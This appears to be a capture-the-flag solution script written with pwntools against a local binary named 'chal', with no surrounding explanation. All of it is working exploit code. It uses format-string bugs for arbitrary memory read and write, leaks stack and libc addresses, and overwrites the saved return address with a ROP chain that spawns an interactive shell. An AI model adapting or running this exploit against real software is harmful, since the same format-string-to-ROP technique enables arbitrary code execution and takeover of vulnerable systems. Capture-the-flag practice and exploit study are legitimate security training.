from pwn import *
context.arch  = 'amd64'
# context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def atk(s):
    ppp = s.ljust(0x100,b'\0')
    p.send(ppp)
    
p = process("./chal")
def calc(a,b):
    if(b>=a):
        return b-a
    else:
        return b+0x10000-a
def aar(addr): # arbitrary address read
    pay = b"%16$s"
    pay = pay.ljust(0x40,b'\0')
    pay+= p64(addr)
    atk(pay)
def aaw(addr,val): # arbitrary address write
    v1 = val & 0xffff
    v2 = (val>>16) & 0xffff
    v3 = (val>>32) & 0xffff
    v4 = (val>>48) & 0xffff
    vul1 = v1
    vul2 = calc(v1,v2)
    vul3 = calc(v2,v3)
    vul4 = calc(v3,v4)
    pay = f"%{vul1}c%22$hn%{vul2}c%23$hn%{vul3}c%24$hn%{vul4}c%25$hn\0".encode() # not perfect for case like 0x0 
    pay = pay.ljust(0x80,b'\0')
    pay+= flat([addr,addr+2,addr+4,addr+6])
    atk(pay)
atk(b"%38$p")
stack = int(p.readline(),16)
log.warning(hex(stack))

atk(b"%41$p")
base = int(p.readline(),16) -(0x7ffff7ded0b3-0x7ffff7dc6000)
log.warning(hex(base))
rdi = base+0x0000000000026b72
ret = 0x0000000000025679+base
# gdb.attach(p,'b *0x55555555526f')

aaw(stack-0xe8,ret)
aaw(stack-0xe0,rdi)
aaw(stack-0xd8,0x7ffff7f7d5aa-0x7ffff7dc6000+base)
aaw(stack-0xd0,0x55410+base)
p.send(b"exit\0")
p.interactive()